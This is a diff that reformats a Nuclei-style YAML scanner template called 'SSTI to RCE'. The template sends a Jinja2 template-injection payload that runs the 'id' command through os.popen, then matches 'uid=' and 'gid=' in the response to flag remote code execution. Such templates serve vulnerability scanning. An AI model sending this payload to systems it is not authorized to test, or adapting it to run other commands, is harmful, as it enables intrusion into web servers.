@@ -1,24 +1,24 @@
-id: ssti-to-rce
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - uid=
+    - gid=
+  matchers-condition: or
+  raw:
+  - 'GET /{{url_for.__globals__.os.popen(''id'').read()}} HTTP/1.1
 
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    '
+  stop-at-first-match: true
+id: ssti-to-rce
 info:
-  name: SSTI to RCE
   author: reewardius
+  name: SSTI to RCE
   severity: critical
   tags: rce,generic
-  
-http:
-  - raw:
-      - |
-        GET /{{url_for.__globals__.os.popen('id').read()}} HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-        
-    stop-at-first-match: true
-    matchers-condition: or
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "uid="
-          - "gid="
-        condition: and
